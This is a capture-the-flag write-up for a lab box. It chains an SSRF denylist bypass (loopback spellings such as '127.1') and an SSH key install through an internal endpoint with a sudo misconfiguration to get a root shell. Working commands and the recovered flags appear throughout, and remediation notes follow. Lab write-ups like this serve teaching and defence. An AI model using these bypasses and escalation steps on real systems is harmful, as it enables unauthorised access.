<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Liaison+Switchboard" alt="Typing SVG" /></a>

</div>

# Liaison Switchboard — PWN · JID-Pwn303 · Level 5 · 🔴 HARD

- **Status:** ✅ SOLVED (4/4) — SSRF → key install → SSH → sudo misconfig, full chain.
- **Points:** — / — (per-flag points not recorded)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (flags 1–2 plaintext, 3–4 `CTF{...}`)
- **Target:** `10.10.10.33` (lab, over VPN, `10.10.10.0/24`)
- **Prompt:** *boot2root — a Python service posing as a Squid proxy on `:3128`*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `2200,3128` | ✅ |
| 2 | Low privilege user | `attache` | ✅ |
| 3 | User flag | `CTF{4d1cb42ce9a8996f7b3be900c345bd04}` | ✅ |
| 4 | Root flag | `CTF{334730c110d70ff6d2d95effb076e146}` | ✅ |

---

## TL;DR

A Python service on `:3128` poses as a Squid proxy but is actually a vulnerable
"Liaison proxy" with an SSRF endpoint (`/fetch?url=`). Its denylist does a plain
*string* comparison on the hostname and never resolves it, so `127.1` reaches
loopback. Through the SSRF we hit an internal admin desk on `127.1:6400` whose
`/set?v=` installs an arbitrary SSH public key for the `attache` account. SSH in
on `:2200`, grab the user flag, then abuse a `sudo NOPASSWD` entry for
`proxy-reload` — a root script that blindly runs `bash /home/attache/routes.conf`
— to read `/root/root.txt`.

## Recon (Flag 1)

Full TCP sweep:

```bash
nmap -p- --min-rate 2000 -T4 -Pn 10.10.10.33
# 2200/tcp open
# 3128/tcp open
```

**Flag 1:** `2200,3128`

Version detection:

```bash
nmap -sC -sV -p2200,3128 -Pn 10.10.10.33
# 2200/tcp open ssh      OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
# 3128/tcp open squid-http?
```

`3128` is the classic Squid port, but probing it reveals a lie: every request —
whatever host/port — returns the same `Server: BaseHTTP/0.6 Python/3.11.2` with a
custom page. It is a Python `http.server` app, not Squid.

```bash
curl -s http://10.10.10.33:3128/
```

The landing page ("Liaison proxy") documents the whole attack surface:

> `GET /fetch?url=` pulls a remote page. The denylist compares the hostname text
> and does not resolve it. Refused strings: `127.0.0.1`, `localhost`, `0.0.0.0`.
> Read `/desk.txt`. It names the SSH account, the internal desk, and the request
> that installs a key.

## SSRF to internal desk (Flags 2 & 3)

`/desk.txt` spells out the path:

```
SSH account: attache
Internal desk: http://127.1:6400/
127.1 is the short form of 127.0.0.1. The proxy compares the hostname text, so
this spelling is not on the denylist, but it is still loopback.
Install a key with GET /set?v=<urlencoded ssh public key>
Fetch that full URL through /fetch?url= on this proxy.
```

**Flag 2:** `attache`

### SSRF bypass

The denylist blocks the literal strings `127.0.0.1`, `localhost`, `0.0.0.0` but
compares text only. `127.1` (and `0`, `0177.0.0.1`, `[::1]`, decimal
`2130706433`) all resolve to loopback and are not on the list.

Confirm reach to the internal desk on `:6400`:

```bash
curl -s -G "http://10.10.10.33:3128/fetch" --data-urlencode "url=http://127.1:6400/"
# internal
```

### Install an SSH key via SSRF

Generate a keypair locally:

```bash
ssh-keygen -t ed25519 -N '' -f ./attache_key
```

The inner desk expects `/set?v=<urlencoded pubkey>`, and that whole inner URL has
to pass through the outer `/fetch?url=`. That means the public key is encoded
twice: once as the `v=` value, and again (together with the inner URL) as the
`url=` value. `curl -G --data-urlencode` handles the outer layer:

```bash
INNER="http://127.1:6400/set?v=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$(cat ./attache_key.pub)")"
curl -s -G "http://10.10.10.33:3128/fetch" --data-urlencode "url=$INNER"
# OK
```

- Outer `/fetch` decodes `url=` once → gets the inner URL with `v=` still
  single-encoded.
- The proxy fetches `http://127.1:6400/set?v=<single-encoded key>`.
- The desk decodes `v=` once → the original public key, installed into
  `attache`'s `authorized_keys`.

### SSH in

```bash
ssh -i ./attache_key -p 2200 attache@10.10.10.33
# uid=1000(attache) ... host bbf2e8af1b39 (container)
cat /home/user.txt
```

**Flag 3:** `CTF{4d1cb42ce9a8996f7b3be900c345bd04}`

## Privilege escalation (Flag 4)

Enumeration as `attache`:

```bash
sudo -l
#   (root) NOPASSWD: /usr/local/bin/proxy-reload
cat ~/routes.conf
#   cat /root/root.txt
```

`proxy-reload` is a root-owned script we can run passwordless. Its body:

```bash
#!/bin/bash
bash /home/attache/routes.conf
```

It executes a file we fully control, as root. The box even ships `routes.conf`
pre-loaded with `cat /root/root.txt`, so no editing is needed:

```bash
sudo /usr/local/bin/proxy-reload
# CTF{334730c110d70ff6d2d95effb076e146}
```

(To run anything else as root, just overwrite `~/routes.conf` first — e.g.
`echo 'cat /root/root.txt' > ~/routes.conf`, or `echo '/bin/bash -p'` for a
root shell.)

**Flag 4:** `CTF{334730c110d70ff6d2d95effb076e146}`

## Vulnerability chain

1. **SSRF via text-only denylist** — hostname blocklist matched as a string and
   never resolved, bypassed with the `127.1` loopback shorthand.
2. **Unauthenticated key install** — an internal admin endpoint (`/set?v=`)
   writes attacker-controlled keys to `authorized_keys`, reachable only through
   the SSRF but trusting anything that reaches it.
3. **`sudo NOPASSWD` running a user-writable file** — `proxy-reload` executes
   `bash /home/attache/routes.conf`, a file owned by the low-priv user, as root:
   trivial arbitrary command execution as root.

## Remediation notes

- Resolve hostnames and block by resolved IP (and the whole loopback / link-local
  / RFC1918 ranges), never by string match. Deny by default.
- The internal desk must authenticate requests and must not accept SSRF-relayed
  calls as trusted.
- A `sudo NOPASSWD` target must never execute a file writable by the invoking
  user. Keep the config root-owned and non-writable, or drop the sudo rule.
